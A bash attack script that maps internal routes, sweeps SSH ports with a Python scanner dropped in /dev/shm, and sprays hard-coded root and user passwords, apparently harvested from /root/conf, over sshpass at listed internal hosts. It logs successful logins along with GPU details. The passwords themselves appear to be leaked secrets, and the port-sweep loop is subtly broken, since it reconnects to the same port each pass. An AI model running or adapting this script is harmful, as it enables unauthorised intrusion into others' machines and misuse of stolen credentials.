#!/bin/bash
# exec9: vendor password ladder (from /root/conf) against vcc-workers and the g-farm
echo "=== ID"; hostname; ip r | grep -E '172\.16|192\.168' | head -5
echo "=== ROUTE"; ip route get 172.16.11.13 2>&1 | head -2; timeout 3 bash -c 'echo > /dev/tcp/172.16.11.13/22' 2>/dev/null && echo "farm-22-OPEN" || echo "farm-22-CLOSED"
echo "=== FARMSWEEP"
cat > /dev/shm/sw.py <<'PY'
import asyncio,sys
async def scan(h):
    sem=asyncio.Semaphore(300); out=[]
    async def one(p):
        async with sem:
            try:
                r,w=await asyncio.wait_for(asyncio.open_connection(h,22),timeout=1.2); w.close(); out.append(p)
            except Exception: pass
    await asyncio.gather(*[one(p) for p in range(1,255)])
    print("FARM22", h, len(out), sorted(out)[:40], flush=True)
for h in sys.argv[1:]: asyncio.run(scan(h))
PY
timeout 240 python3 /dev/shm/sw.py 172.16.10.1 172.16.10.2 172.16.11.1 172.16.11.2 2>&1 | grep -a '^FARM22'
echo "=== LADDER"
try(){ # host user pass
  r=$(timeout 14 sshpass -p "$3" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$2@$1" 'id; hostname; nvidia-smi --query-gpu=name --format=csv,noheader | head -2' 2>&1 | tr '\n' '|')
  case "$r" in *uid=*) echo "HIT $2@$1 pass[$4] => ${r:0:160}"; return 0;; *) echo "no  $2@$1 pass[$4]";; esac
}
for h in 192.168.0.28 192.168.0.30 192.168.0.31 192.168.0.20 192.168.0.22; do
  try $h root 'Bingxing.2026' A
  try $h root 'Admin@123_para#!2024' B
  try $h root 'Beijingcs.2024' C
  try $h kgzs 'Kgzs@2024' D
  try $h ubuntu 'ubuntu@' E
done
echo "=== FARMLADDER"
for h in 172.16.11.13 172.16.11.14 172.16.11.15 172.16.10.71 172.16.10.72 172.16.10.73 10.20.30.208; do
  try $h root 'Bingxing.2026' A
  try $h kgzs 'Kgzs@2024' D
done
echo "=== HOSTS172_10"
timeout 20 python3 -c "
import asyncio
async def m():
    sem=asyncio.Semaphore(200); out=[]
    async def one(i):
        async with sem:
            try:
                r,w=await asyncio.wait_for(asyncio.open_connection('172.16.10.%d'%i,22),timeout=1.0); w.close(); out.append(i)
            except Exception: pass
    await asyncio.gather(*[one(i) for i in range(1,255)])
    print('OPEN10', sorted(out))
asyncio.run(m())" 2>&1 | tail -2
echo "=== DONE"
